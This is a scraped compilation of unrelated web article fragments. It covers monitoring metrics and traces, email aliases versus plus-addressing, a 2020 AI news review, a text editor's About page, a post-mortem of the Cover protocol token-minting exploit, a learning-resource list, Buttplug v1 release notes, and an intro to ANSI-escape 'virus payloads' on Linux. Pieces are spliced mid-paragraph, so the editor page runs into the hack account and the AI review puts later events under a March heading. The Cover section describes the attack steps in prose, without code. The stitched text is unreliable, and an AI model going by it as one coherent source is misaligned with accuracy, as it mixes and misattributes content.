This property can be used to simplify some monitoring configurations.</p><p>Bins can be defined statically (as in the example above), or using a function. Binning might be performed either by the system reporting the metric, or by the monitoring infrastructure.</p><ul><li>With <b>client-side binning</b>, the reporter decides how fine-grained the distribution should be.<ul><li>This is usually configurable per-metric by a command-line flag or config setting.</li><li>Changing the binning can cause vertical aberrations in visualisations.</li></ul></li><li>With <b>collector-side binning</b>, the client reports the events as-is and the monitoring infrastructure aggregates the data before storing/forwarding it.<ul><li>Example: collector receives raw distribution samples from its clients, and records {50,90,95,99}th percentiles over a trailing window.</li><li>This can be significantly less flexible, and it is often difficult to visualize percentiles as usefully as a full distribution.</li></ul></li></ul></blog-section><blog-section><h3 slot="title">Metric Names</h3><p>I know of three styles for metric names:</p><ul><li>The <a href="https://prometheus.io/docs/practices/naming/">Prometheus Style Guide</a> recommends <code>myapp_descriptive_snake_case</code>, where <code>myapp_</code> is a one-word prefix specific to the system being monitored. This style is derived from <a href="http://landing.google.com/sre/book/chapters/practical-alerting.html">Google Borgmon</a>, which uses metric names as symbols in its configuration DSL<blog-footnote-ref>[<a href="#fn:4">4</a>]</blog-footnote-ref>.<ul><li><a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/CW_Support_For_AWS.html">Amazon CloudWatch metrics</a> use this format, without a prefix.</li></ul></li><li><a href="https://github.com/etsy/statsd">statsd</a> and its derivatives use <code>short.dotted.words</code>, though the exact symbol set can vary between vendors.<ul><li>For example, <a href="https://help.datadoghq.com/hc/en-us/articles/203764705-What-are-valid-metric-names-">DataDog allows alphanum, underscores, and periods</a>.</li></ul></li><li><a href="https://cloud.google.com/monitoring/api/metrics_gcp">Google Stackdriver</a> uses <code>myapp.com/unix/filesystem/paths</code>, with each product having its own "subdirectory" in the metrics hierarchy.<ul><li>The same style is applied to <a href="https://cloud.google.com/monitoring/api/metrics_aws">AWS metrics in Stackdriver</a>, by adding product-specific prefixes for each CloudWatch metric.</li></ul></li></ul><p>My personal favorite is the UNIX paths style, which I've seen used to great success. Engineers exposed to this style begin to naturally lay out metric hierarchies, with clear meanings and good namespacing. I don't have any solid data about <i>why</i> the naming style has such an effect, but I suspect it has something to do with familiarity:</p><ul><li>A metric name like <code>http_request_count</code> is well and good, but <code>myapp_com.net.http.server.request_count</code> looks <i>wrong</i> to an experienced engineer. Expressions that use that many dots violate the <a href="http://wiki.c2.com/?LawOfDemeter">Law of Demeter</a>.</li><li>In contrast, path-shaped metric names like <code>myapp.com/net/http/server/request_count</code> inspire no such negative thoughts. Long paths are common in UNIX environments, and it's certainly no harder to remember than many of the paths in Linux's <code>sysfs</code>.</li></ul></blog-section></blog-section><blog-section><h2 slot="title">Traces</h2><p>While metrics help understand the system in aggregate, traces are used to understand the relationship between the parts of a system that processed a particular request.</p><p>A trace is a tree of <i>spans</i>, which each represent a logical region of the system's execution time. Spans are nested – all spans except the <i>root span</i> have a <i>parent span</i>, and a trace is constructed by walking the tree to link parents with their children.</p><pre>########################  GET /user/messages/inbox

</pre><p>Spans and traces can be understood by analogy to lower-level programming concepts. If a trace is a stack trace, then a span is a single stack frame. Just as every stack frame is pushed and popped, each span begins and ends. It's the timing of when the spans begin and end that is interesting when analysing a trace.</p><p>Each span is implicitly a sample of a duration distribution, and therefore also a counter<blog-footnote-ref>[<a href="#fn:5">5</a>]</blog-footnote-ref>.</p><p>Tools for creating and recording traces are currently less mature than for creating metrics, and a wide variety of tracing platforms exists. <a href="http://opentracing.io/">OpenTracing</a> is an attempt to provide vendor-neutral APIs for many languages so that tracing support can more easily be added to shared libraries.</p></blog-section><blog-section><h2 slot="title">Events</h2><p>Events are conceptually similar to logging, …</p></blog-section></blog-article></div></div>

        <p><a href="https://en.wikipedia.org/wiki/Email_address#Subaddressing">Email subaddressing</a>, also known as plus sign (+) trick, is popularized by Gmail and now supported by most email providers. It allows creating a new email address by simply appending the plus sign(<strong>+</strong>) to your current email address.</p>
<p>For example, if your email address is <code>name@email.com</code>, you can quickly create a new email address like <code>name+facebook@email.com</code> for Facebook, <code>name+twitter@email.com</code> for Twitter, etc.</p>
<p>Here’s a closer look at the pros and cons of using the plus sign trick, especially when compared with email aliases.</p>

        

        

        <h3 id="plus-sign-trick-advantages">Plus sign trick advantages</h3>
<p>The main advantage of the plus sign trick is it’s easy to use and already available.</p>
<p>If you use email filters, email subaddressing is also very useful. For example, you can set up a filter to move all emails sent to <code>name+groupon@email.com</code> to the <strong>Promotion</strong> folder.</p>
<p>With subaddressing, you can create an unlimited number of email addresses: just add something after the plus sign and youâ€™ll have a new email address.</p>
<p>If you are a developer or work in QA, being able to quickly create a new email address is very helpful when testing a website or application.</p>
<h3 id="what-are-simplelogin-email-aliases">What are SimpleLogin email aliases?</h3>
<p>An email alias is simply a forwarding email address. Emails sent to an email alias are forwarded to your original email address.</p>
<p>Like the plus sign trick, SimpleLogin allows you to have a different email address for each website: just create a new email alias everytime you need an email address.</p>
<p>Usually an email alias only allows email forwarding but with SimpleLogin, you can also send emails or reply from your email alias.</p>
<p>Currently there are 4 ways of creating a new email alias in SimpleLogin:</p>
<ul>
<li>If you are on a laptop/PC, the <a href="https://addons.mozilla.org/firefox/addon/simplelogin/">Firefox</a> or <a href="https://chrome.google.com/webstore/detail/dphilobhebphkdjbpfohgikllaljmgbn">Chrome</a> extension allows creating a new email alias by clicking on the SimpleLogin icon in the email field. You can also use the right click menu to create a new email alias.</li>
</ul>
<p><img src="https://sldev.ovh/images/one-click-alias.gif" alt=""></p>
<ul>
<li>
<p>Using one of SimpleLogin apps: <a href="https://app.simplelogin.io/">website</a>, Firefox/Chrome extension popup or <a href="https://play.google.com/store/apps/details?id=io.simplelogin.android">Android</a>/<a href="https://apps.apple.com/app/id1494359858">iOS</a> app for more customization. This is the most flexible way and offers advanced options.</p>
</li>
<li>
<p>Creating email aliases on the fly via <strong>catch-all</strong> domain. If you own a domain, you can enable the catch-all option that allows you to use <code>can_be_anything@your-domain.com</code> as email address: it’s automatically created when an email is sent to this address.</p>
</li>
<li>
<p>Creating email aliases on the fly via <a href="https://simplelogin.io/blog/alias-directory/">directory</a>: this is actually similar to the plus sign trick. If you have a directory called <strong>newsletter</strong>, you can then use <code>newsletter+python@simplelogin.fr</code> when signing for a Python newsletter.</p>
</li>
</ul>
<h3 id="plus-sign-trick-email-address-isnt-good-for-privacy">Plus sign trick email address isn’t good for privacy</h3>
<p>Though practical, plus sign trick is well-known and your real email address can be easily extracted: one just needs to remove the part after the plus sign. For this reason, if your subaddress appears in an email leak (that you can easily verify on <a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a>), a bad actor can extract your real email address and uses it for a spam/phishing campaign or to match with other data breaches.</p>
<p>Email addresses that contain the plus sign are sometimes (incorrectly) considered invalid. Even worse, a website can silently drop the part after the plus sign and use your real email address instead.</p>
<p>If you use Gmail, you can’t also reply from the subaddress. When you reply to an email sent to a <code>name+newsletter@gmail.com</code>, the reply will come from your real email address <code>name@gmail.com</code></p>
<h3 id="email-aliases-protect-your-privacy">Email aliases protect your privacy</h3>
<p>An email alias is random and there’s no way to link 2 email aliases to the same person.</p>
<p>For email aliases created with a catch-all domain, they can only be linked together if the domain is known to have the catch-all option enabled. There’s no way to detect whether a domain has this option enabled or to know how many people are using a domain, a bad actor usually ignores these email addresses altogether.</p>
<p>For email aliases created via <strong>directory</strong>, you can use a different separator than the plus sign to reduce the chance of your email aliases being linked together. SimpleLogin also supports the hash sign (#) and the slash sign (/) as separator and in the future, you can also use directory as a subdomain (i.e. <code>newsletter.simplelogin.fr</code>). You can then either use <code>newsletter/python@simplelogin.fr</code>, <code>newsletter#python@simplelogin.fr</code> or <code>python@newsletter.simplelogin.fr</code> as email address.</p>
<h3 id="email-aliases-reveal-who-are-selling-your-data">Email aliases reveal who are selling your data</h3>
<p>If you use a different email alias for each website and one of your aliases starts receiving emails it isn’t supposed to receive, you can be sure that this alias is either leaked or sold.</p>
<p>For example, if your email alias for Facebook receives emails from LinkedIn, that means Facebook has sold your data to LinkedIn or they’ve had a data breach. Either way, you can just disable this alias. Your real email address stays hidden.</p>
<p>Data brokers, <a href="https://www.webfx.com/blog/general/what-are-data-brokers-and-what-is-your-data-worth-infographic/">a $200 billion industry</a> use your email address as the common denominator to match users between different datasets. Having thousands of email addresses make their job harder and your privacy better.</p>
<h3 id="email-aliases-are-more-flexible">Email aliases are more flexible</h3>
<p>With email aliases, it’s easy to change where emails are forwarded. You can just add an additional mailbox so every email sent to your email aliases is forwarded to both mailboxes.</p>
<p>You can also have more complex setup like having an email alias for a shoping website that forwards to both your mailbox and your partner’s mailbox. Or an email alias for your support team that allows anyone to receive customer requests and reply from the support email address.</p>
<h3 id="additional-protection">Additional protection</h3>
<p>On popular email services like Gmail, Outlook, your emails are stored in plaintext, meaning anyone who has access to their servers can read your emails. Even though these services claim to have a strict policy in place and promise they would never read your emails, scandals in the past have shown otherwise. With the <a href="https://blog.twitter.com/en_us/topics/company/2020/an-update-on-our-security-incident.html">recent Twitter hack</a>, an employee can be social-engineered to leak the data or leave a backdoor for hackers.</p>
<p><a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">Pretty Good Privacy</a> (PGP) was created in 1991 as a way to encrypt your emails, texts, files, etc. Used by Edward Snowden, journalists, dissidents, … PGP is highly secure and almost unbreakable.</p>
<p>In PGP, you have 2 keys: the private key that allows you to decrypt the emails and that you should never lose. The public key is public (hence the name) that allows anyone who wants to send you an email to encrypt the email. Only you can then read the encrypted email.</p>
<p>SimpleLogin <a href="https://simplelogin.io/blog/introducing-pgp/">supports PGP</a> and allows you to use PGP on email services that don’t natively support it. For example, you can use PGP on your Gmail using browser extensions like <a href="https://www.mailvelope.com/en">Mailvelope</a> or <a href="https://flowcrypt.com/">FlowCrypt</a> and have SimpleLogin encrypting all emails sent to your Gmail.</p>
<h3 id="security">Security</h3>
<p>Though primarily focused on privacy, email aliases are a good way to increase your online security. Email address is usually used with password as account credential. If you use a different email alias for each website, a bad actor now needs to know both your password and the email alias in order to hack your account.</p>
<h3 id="recommendations">Recommendations</h3>
<p>With multiple advantages over plus sign trick, email aliases is a great tool to protect your online privacy. It’s recommended to use a password manager to help remember the email aliases used on different websites.</p>

      <h4>An overview of the big AI-related stories of 2020</h4>
      
      </div><div>
      <h2 id="overview">Overview</h2>

<p>With 2020 (finally) drawing to a close, it’s a good time to reflect on what happened with AI in the this most weird year. Above is a wordcloud of the most common words used in titles of articles we’ve curated in our <a href="https://lastweekin.ai/">‘Last Week in AI’ newsletter</a> over this past year. This reflects just about 1000 articles that we’ve included in the newsletter in 2020:</p>

<p>Unsurprisingly, the vague but recognizable term “AI” remained the most popular term to use in article titles, with specifics such as “Deep Learning” or “neural network” remaining comparatively rare:</p>

<p>Digging a bit deeper, we find that Coronavirus and Facial Recognition were the biggest topics of the year, followed by bias, deepfakes, and other topics:</p>

<p>But enough overview – let’s go through the most significant articles we’ve curated from the past year, month by month. As in with our newsletter, these articles will be about Advances &amp; Business, Concerns &amp; Hype, Analysis &amp; Policy, and in some cases Expert Opinions &amp; Discussion within the field. They will be presented in chronological order, and represent a curated selection that we believe are particularly noteworthy. Click on the name of the month for the full newsletter release that started out that month.</p>

</ul>

<h2 id="march"><a href="https://lastweekin.ai/p/2611449_new-article-digest-54">March</a></h2>

<p>March was a big month with three stories standing out.
First is the closing of <strong>Starsky Robotics</strong>, a promising startup that worked on self-driving trucks.
In a detailed blog post, the founder discussed the immense challenges in technology, safety, and economics that face the autonomous driving industry.</p>

<ul>
  <li><a href="https://medium.com/starsky-robotics-blog/the-end-of-starsky-robotics-acb8a6a8a5f5">The End of Starsky Robotics</a></li>
</ul>

<p>Second is the publicity of <strong>Clearview AI</strong>, which violated many ethical and legal norms by scraping pictures of faces on the Internet to power its facial recognition system that allows its customers, from law enforcement to retail chains, to search for anyone with a picture of their face.</p>

<ul>
  <li><a href="https://www.buzzfeednews.com/article/ryanmac/clearview-ai-fbi-ice-global-law-enforcement">Clearview’s Facial Recognition App Has Been Used By The Justice Department, ICE, Macy’s, Walmart, And The NBA</a></li>

</ul>

<p>Lastly is the flood of reports on the fast-developing <strong>Covid-19</strong> and the roles AI/robotics can (and cannot) play to help alleviate the pandemic.</p>

<p>This month saw the massive protests following <strong>George Floyd</strong>’s killing, leading many to re-examine police conducts in the U.S.
Within the AI community, this often meant questioning police use of facial recognition technologies and the inherent bias in the deployed AI algorithms.
It is under this backdrop that companies like Amazon and IBM put a pause to selling facial recognition software to law enforcement, and many nuanced conversations followed.</p>

<h2>About</h2>
<p><b>Code Browser</b> is a folding text editor for Linux and Windows, 
designed to hierarchically structure any kind of text file and especially source 
code. It makes navigation through source code faster and easier.

</p><center><img src="https://tibleiz.net/code-browser/images/code-browser.png"></center>

<p>Code Browser is especially designed to keep a good overview of the code of 
large projects, but is also useful for a simple CSS file. 
Ideal if you are fed up of having to scroll through thousands of lines of code.

</p><p>See the <a href="https://tibleiz.net/code-browser/code-folding.html">Introduction to Code Folding</a> page if you
want more information on text folding and the way it is implemented in Code Browser.

</p><p>It supports syntax highlighting for all major languages and custom syntax 
highlighting can also be added.

</p><p>Although Code Browser was initially designed to edit programs, it can 
also be used for different tasks such as plain text outlining or helping to understand
existing source code. I've added a page with suggestions to
<a href="https://tibleiz.net/code-browser/tips.html">take advantage of folding</a>.

Multiple hackers used the bug to mint practically infinite tokens. The hackers now owe trillions of dollars in taxes to their governments.</p><p>The biggest hacker burned most of the hacked tokens and <a href="https://etherscan.io/tx/0xc2fd5094c1e108f83222a86bd46b35fc0da35616385d681964b22003643f982e" target="_blank" rel="noreferrer noopener nofollow">returned 4350 ether</a> but there still are around 70 thousand Cover tokens in circulation that were created using this exploit and shouldn’t exist.

The contract caches the pool data in memory to save some gas, updates the pool data in storage but forgets to update the cached data. The outdated cached data is later used in calculations and that enables the hack.</p><div><figure><a href="https://mudit.blog/wp-content/uploads/2020/12/Cover-hack.jpg"><img loading="lazy" src="https://mudit.blog/wp-content/uploads/2020/12/Cover-hack-1024x349.jpg" alt="" width="1006" height="343" srcset="https://mudit.blog/wp-content/uploads/2020/12/Cover-hack-1024x349.jpg 1024w, https://mudit.blog/wp-content/uploads/2020/12/Cover-hack-300x102.jpg 300w, https://mudit.blog/wp-content/uploads/2020/12/Cover-hack-768x262.jpg 768w, https://mudit.blog/wp-content/uploads/2020/12/Cover-hack.jpg 1214w" sizes="(max-width: 1006px) 100vw, 1006px"></a><figcaption>Bug in Cover protocol’s Blacksmith contract</figcaption></figure></div><blockquote><p>There are only 3 hard problems in computer science:<br>1) cache invalidation<br>3) <em>multithreading/asynchronous programming</em><br>2) <em>naming things</em><br>4) <em>off-by-1 errors</em></p></blockquote><h2>How it was executed</h2><ol><li>A new pool was <a href="https://etherscan.io/tx/0xe5173fffaed3342b53d41319dc538e7923e287e962df2d27f5e425c633db45d4" target="_blank" rel="noreferrer noopener nofollow">approved</a> for liquidity mining, merely hours before the hack. This pool is perfectly normal but since it was new, the blacksmith contract didn’t have any LP token of this pool.</li><li>The attacker <a href="https://etherscan.io/tx/0x77490baee41a9b35a6e87d49453c7329c7517c10ce6ce26b4c142692a2877e65" target="_blank" rel="noreferrer noopener nofollow">deposited</a> some tokens of this pool into the Blacksmith contract.</li><li>The Blacksmith contract keeps track of rewards on a per token basis. If a lot of tokens are locked, the per token reward will be small. If very few tokens are locked, the per token reward will be large. The relevant variable is called <code>accRewardsPerToken</code> and is calculated as <code>totalPoolRewards / totalTokenBalance</code>.</li><li>The attacker then <a href="https://etherscan.io/tx/0x88ce99fc1cb695db82d83ce5fe587396744841d3a123687f95b18df6a3106818" target="_blank" rel="noreferrer noopener nofollow">withdrew</a> almost all of the LP tokens from the Blacksmith contract, reducing the <code>totalTokenBalance</code> amount to almost zero.</li><li>The attacker then <a href="https://etherscan.io/tx/https://etherscan.io/tx/0xbd1fcda7006ddd58b18cb3bfbd01ef2d1a979be596e1c73be1d7d65fd7eb8215" target="_blank" rel="noreferrer noopener nofollow">deposited</a> some tokens of this pool again into the Blacksmith contract. This is where the bug showed its true colors. Since the <code>totalTokenBalance</code> was reduced a lot in the previous transaction, the newly calculated <code>accRewardsPerToken</code> shot up. The contract uses <code>rewardWriteoff</code> to keep the affect of <code>accRewardsPerToken</code> in check. However, due to the bug, the old (small) value of <code>accRewardsPerToken</code> was used when calculating the <code>rewardWriteoff</code> value. Due to this, the large value of <code>accRewardsPerToken</code> remained unchecked.</li><li>The attacker then <a href="https://etherscan.io/tx/0xca135d1c4268d6354a019b66946d4fbe4de6f7ddf0ff56389a5cc2ba695b035f" target="_blank" rel="noreferrer noopener nofollow">withdrew</a> their rewards. Since there was a large, unchecked value in <code>accRewardsPerToken</code>, the total reward paid out of the system got inflated and the contract ended up minting 40,796,131,214,802,500,000 COVER tokens.</li></ol><p>These were the steps followed by the biggest hackers. Others did very similar stuff.</p><h2>Final thoughts</h2><p>The COVER protocol team was asleep while all of this was going on but they removed minting access from the Blacksmith contract as soon as they wake up to stop the attacks. They are now <a href="https://twitter.com/CoverProtocol/status/1343581331448586245" target="_blank" rel="noreferrer noopener nofollow">considering</a> restoring a snapshot of the Tokens before the hack.</p><p>Restoring snapshots is definitely controversial but it seems like the best way forward. A similar thing was done with Bitcoin in 2013 when a <a href="https://bitcoinmagazine.com/articles/bitcoin-network-shaken-by-blockchain-fork-1363144448" target="_blank" rel="noreferrer noopener nofollow">hacker managed to mint infinite bitcoins.</a> I’d advise the Cover team to fix the bug, get a fresh audit from a new team and then relaunch the new token.</p><p>H/T <a href="https://twitter.com/bantg" target="_blank" rel="noreferrer noopener nofollow">banteg</a>, <a href="https://twitter.com/nomorebear" target="_blank" rel="noreferrer noopener nofollow">Sorawit Suriyakarn</a>, and <a href="https://twitter.com/valentinmihov" target="_blank" rel="noreferrer noopener nofollow">Valentin Mihov</a>.</p></div></div></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Great learning materials are rare. This is a collection of gems I’ve encountered over the years, presented as a 90’s style web link list, intended for anyone who wants to learn new skills.</p>
<hr>

<p><a href="https://www.coursera.org/learn/machine-learning" target="_blank">Machine Learning Coursera Course</a> by Andrew Ng</p>
<p><strong>Skill:</strong> Machine Learning — learn how to apply existing machine learning techniques, understand why they work, and how to troubleshoot issues.</p>
<p><strong>Type of material:</strong> Videos and coding exercises</p>
<p><strong>Why is it good:</strong> Great interplay between lectures and exercises. Clarity of explanations. Introductory scope. Enough math to understand why these methods work, but not too much.</p>
<hr>

<p><a href="https://cses.fi/book/index.php" target="_blank">Competitive Programmer’s Handbook</a> by Antti Laaksonen</p>
<p><strong>Skill:</strong> Exact algorithms — learn how to invent algorithms for ”code competition” -type problems (problems where exactly-correct answer is required and the main challenge is time or memory complexity).</p>
<p><strong>Type of material:</strong> Book</p>
<p><strong>Why is it good:</strong> Simplified explanations of many algorithmic techniques and algorithmic problem solving approaches. Unlike most algorithm books, this one is focused on ideas and code, not on the underlying math. This is the ”bible” of Finnish competitive programmers.</p>
<hr>

<p><a href="https://cs.gmu.edu/~sean/book/metaheuristics/" target="_blank">Essentials of Metaheuristics</a> by Sean Luke</p>
<p><strong>Skill:</strong> Optimization algorithms — learn techniques to find ”good enough” solutions for problems where an exactly-correct solution is not required. Typically used when an exact algorithm would be computationally infeasible and machine learning methods can not be applied. For example, route optimization often falls into this category.</p>
<p><strong>Type of material:</strong> Book</p>
<p><strong>Why is it good:</strong> A practical approach. Scope. Clarity of explanations. I recommend you to read this book while implementing and testing selected approaches on a real problem as you go along.</p>
<hr>

<p><a href="https://www.youtube.com/channel/UC1usFRN4LCMcfIV7UjHNuQg/videos" target="_blank">Introduction to Cryptography</a> by Christof Paar</p>
<p><strong>Skill:</strong> Cryptography</p>
<p><strong>Type of material:</strong> Videos</p>
<p><strong>Why is it good:</strong> Clarity of explanations and visual illustrations. Entertaining presentation style.</p>
<hr>

<p><a href="https://www.datacamp.com/community/tutorials/how-to-become-a-data-scientist" target="_blank">Become a Data Scientist</a> by DataCamp</p>
<p><strong>Skill:</strong> Data Science</p>
<p><strong>Type of material:</strong> Infographic</p>
<p><strong>Why is it good:</strong> The entire field, from all angles, in one beautiful illustration.</p>
<hr>

<p><a href="https://scrimba.com/learn/learnreact" target="_blank">Scrimba React course</a> by Bob Ziroll</p>
<p><strong>Skill:</strong> ReactJS — learn React fundamentals and practical coding skills</p>
<p><strong>Type of material:</strong> Interactive screencasts</p>
<p><strong>Why is it good:</strong> A modern way of combining lecture/presentation -elements and a development environment where you can practice on code exercises. Runs in your browser.</p>
<hr>

<p><a href="https://www.bloomberg.com/opinion/authors/ARbTQlRLRjE/matthew-s-levine" target="_blank">Money Stuff</a> by Matt Levine</p>
<p><strong>Skill:</strong> Finance — learn that everything is securities fraud.</p>
<p><strong>Type of material:</strong> Email newsletter</p>
<p><strong>Why is it good:</strong> Marvelous writing style. Unpacks recent events in finance with simplicity and wit, often connecting them to larger themes that run through the newsletter over time. Hugely entertaining and educational. Also released as web articles if you don’t want to give out your email.</p>
<hr>

<p><a href="https://learningmusic.ableton.com/" target="_blank">Learning Music</a> by Ableton</p>
<p><strong>Skill:</strong> Composing music</p>
<p><strong>Type of material:</strong> Interactive website</p>
<p><strong>Why is it good:</strong> Experiment with composing music directly in your browser. No previous experience required. The tutorial begins with simple composing examples and tasks along with teaching basic fundamentals of music.</p>

<p>For the project, this is actually a contraction rather than an expansion. Version 1 means that the project has slimmed down to a <a href="https://github.com/buttplugio/buttplug-rs">core Rust implementation</a> upon which the ecosystem can continue to grow.</p>



<p>Buttplug v1.0.0 is available in the following flavors:</p>



<ul><li>Rust – <a href="https://crates.io/crates/buttplug">Crates.io</a>, <a href="https://github.com/buttplugio/buttplug-rs">Github</a></li><li>C# – <a href="https://www.nuget.org/packages/Buttplug">Nuget</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li><li>JS/Typescript (via WASM, Web-only currently) – <a href="https://www.npmjs.com/package/buttplug">NPM</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li></ul>



<p>The <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> covers basic usage, with examples in all of the aforementioned languages.</p>



<h2>What Even Is Buttplug?</h2>



<p><a href="https://buttplug.io/">Buttplug</a> is a haptics abstraction library for intimate hardware. </p>



<p>Which is a fancy way of saying “a way of telling a bunch of different vibrators how to vibrate”. Though it can tell hardware how to do things other than vibrate, and it supports more form factors than buttplugs.</p>



<p>Basically, there are <a href="https://iostindex.com/">hundreds of computer controlled sex toys out there</a>. Most of them have unique protocols to control them. Buttplug tries to centralize these control protocols, handles cross platform USB/Bluetooth/serial/etc for the developer, and presents a uniform way of controlling the whatever toy the user may have. Instead of knowing what operating system the user is on and how to talk to their specific toy, developers can use Buttplug to enumerate for a supported device, then send generic commands like “vibrate/rotate at [speed]”. That’s it.</p>



<p>While the sex toy control part of Buttplug is probably the most recognizable and memorable feature, it’s not the only goal of the project. Buttplug was established as an experiment for creating user-focused haptics and interface device abstraction. Libraries and engines like <a href="https://www.chai3d.org/">Chai3D</a> and <a href="https://h3dapi.org/">H3D</a> work as generalized haptics engines for studying mechanical systems, texture and force creation/simulation, while other systems like <a href="https://vrpn.github.io/">VRPN</a> work as a sort of user-space HID manager for systems that may not conform to general HID protocol boundaries. Buttplug seeks to take these two paradigms, and smoosh them together while also servicing a niche that doesn’t get much engineering attention. This leads to many interesting questions, like:</p>



<ul><li>How do we quickly and reliably bring up hardware communication across multiple platforms?</li><li>How do we interact with a user whose affective state may differ from someone using “normal” software like a word processor or database?</li><li>How do we create a language expressive enough to generate the experience a user wants, while also abstract enough to not be device specific?</li><li>What are the <a href="https://buttplug-developer-guide.docs.buttplug.io/intro/buttplug-ethics.html">ethical implications of building open source technology for intimacy</a>?</li><li>Can these questions be approached through technology in a way that is maintainable by a small, possibly one person team?</li></ul>



<p>We’ve heard from our community that some users are just interested in controlling sex toys, though, and that’s fine too. I guess.</p>

<h2>A Short-ish History of Buttplug</h2>



<p>Here’s an overview of the 16 year path from my start in sex tech to a v1 library for the field.</p>



<ul><li>2004<ul><li><a href="https://kyle.machul.is/">Kyle</a> starts <a href="https://metafetish.com/">Slashdong (which became Metafetish, now defunct)</a> to write about sex tech engineering.</li></ul></li><li>2007<ul><li><a href="https://youtu.be/FRLygav4tcs">Kyle gives a presentation at Arse Elektronika mentioning “Obfuscated Macros”</a>, which at the time seemed like a great name because Kyle was a 20-something engineer.

<h2>What Buttplug Version 1 Means</h2>



<p>To me, a lot. To you, possibly not so much.</p>



<p>As mentioned, Buttplug Version 1 doesn’t really come with a lot of new features. It’s mostly a point where I can cut old stuff and start looking toward the future.</p>



<p><a href="https://github.com/buttplugio/buttplug-csharp">Buttplug C#</a> and <a href="https://github.com/buttplugio/buttplug-js">Buttplug JS</a> will now be archived, as implementations now live in our <a href="https://github.com/buttplugio/buttplug-rs-ffi">FFI repo</a>, and their respective <a href="https://www.nuget.org/packages/Buttplug/">nuget</a> and <a href="https://www.npmjs.com/package/buttplug">npm</a> packages will still live on as v1 and beyond. There will definitely be breaking changes between the v0.x and v1 versions for C#/JS, so if you’ve been developing on those, be ready. I did my best to keep the APIs similar, but also used this as a way to clean up some problems that had cropped up along the way.</p>



<p>Before v1, adding new features or hardware protocols meant implementing things in at least 2 places. Now, features can be implemented in Rust, then all that is required is a rebuild of the FFI and package version numbers being rolled. At worse, the FFI API surface may require changes, but that’s fairly trivial work versus having to redo full feature implementations. Most of the FFI work is up front in the initial implementation, and the hope is that continued maintenance will be much simpler. Time will tell whether this was a total mistake.</p>



<p>Success will be measured via this possible reduction of rote coding work. I’d like to spend more time on design with a flexible system versus having to re-implement my ideas multiple times to test them out across all platforms.</p>



<p>The Version 1 release will also probably be the only time that multiple libraries are released in lockstep with the same version number. I suspect that the FFI libraries will have API surface level issues that will require major version rolls outside of when the rust library updates. Everyone who has an affinity for version numbers, enjoy these stars aligning now, because it’s probably the last time it’ll happen.</p>



<h2>What’s Next</h2>



<p>There’s so many directions to go now that it’s almost hard to pick which to start with, but here’s some general ideas of what I’d like to do next:</p>



<ul><li>Blog Posts<ul><li>I have this shiny new blog now and I’d like to use it more. I have a lot of thoughts about Rust, WASM, and other technologies I’m using that I’d like to cover here.</li></ul></li><li>Documentation<ul><li>Buttplug v1 is documented just enough to maybe get people started, but the <a href="https://buttplug-developer-guide.docs.buttplug.io/">developer guide</a> and API documentation for the various implementations definitely need more love.</li></ul></li><li>More FFI Implementations<ul><li>Python is on the way soon, and C/C++ (especially for Unreal Engine suppot) and Java/Kotlin have been requested by the community.</li></ul></li><li>Application Updates<ul><li>I maintain a few applications, like <a href="https://intiface.com/desktop">Intiface Desktop</a> and the <a href="https://intiface.com/ghr">Game Haptics Router</a>, that have been backburnered while v1 was in progress. Would really like to get those updated and add some new features. Also need to update dependent libraries, like our <a href="https://github.com/buttplugio/buttplug-unity">Unity Game Engine</a> and <a href="https://github.com/buttplugio/buttplug-twine">Twine Game Engine</a> support.</li></ul></li><li>Hardware Support<ul><li>The v1 slog (this was supposed to be done in October, then <a href="https://www.supergiantgames.com/games/hades/">Hades</a> happened. Oops.) means hardware support for things like the <a href="https://patreon.com/tempestvr">OSR2</a> and <a href="https://github.com/buttplugio/buttplug-rs/issues/151">Nintendo Joycon</a> are still in development and running behind.</li></ul></li><li>Actually Making New Stuff<ul><li>Everything listed so far is continued maintenance. It’d be nice to actually make some new things too. Don’t know what those will be, but I need to actually create with my creation, instead of just creating my creation.</li></ul></li></ul>

<h3 id="overview">Overview</h3>

<p>How can one not find command line art amusing? Specially when we are talking about computer viruses and even more so when referencing MS-DOS ones. The 16 bit era gave us some of the most interesting <a href="https://www.wired.com/2013/10/15-awesome-looking-viruses-from-the-ms-dos-era/">computer virus payloads</a> of all time, but achieving something like this today is not as <em>“trivial”</em> anymore.</p>

<p>As Linux is my OS of choice, I wanted to find something that could get close to these MS-DOS fun payloads for my own modern viruses, and, while it’s possible to <a href="http://seenaburns.com/2018/04/04/writing-to-the-framebuffer/">write directly to the framebuffer</a>, I wanted to try something related to terminal emulators instead. Enter <strong><em>ANSI escape sequences</em></strong>.</p>

<h3 id="how-it-works">How it works</h3>

<blockquote>
<p><em>ANSI escape sequences are a standard for <a href="https://en.wikipedia.org/wiki/In-band_signaling">in-band signaling</a> to control cursor location, color, font styling, and other options on video <a href="https://en.wikipedia.org/wiki/Text_terminal">text terminals</a> and <a href="https://en.wikipedia.org/wiki/Terminal_emulator">terminal emulators</a>. Certain sequences of <a href="https://en.wikipedia.org/wiki/Byte">bytes</a>, most starting with an <a href="https://en.wikipedia.org/wiki/Escape_character#ASCII_escape_character">ASCII Escape</a> and <a href="https://en.wikipedia.org/wiki/Bracket">bracket</a> character followed by parameters, are embedded into text. The terminal interprets these sequences as commands, rather than text to display verbatim.</em></p>

<p><em>ANSI sequences were introduced in the 1970s to replace vendor-specific sequences and became widespread in the computer equipment market by the early 1980s. They are used in development, scientific, commercial text-based applications as well as <a href="https://en.wikipedia.org/wiki/Bulletin_board_system">bulletin board systems</a> to offer standardized functionality.</em></p>

<p><em>Read more: <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">https://en.wikipedia.org/wiki/ANSI_escape_code</a></em></p>
</blockquote>

<p>Lots and lots of things you use daily are probably using ANSI escape codes, every time you see colored text on your terminal. Text-based user interfaces, a.k.a <a href="https://en.wikipedia.org/wiki/Text-based_user_interface">TUIs</a> need these control codes to <em>“draw”</em> what you see on your screen.</p>

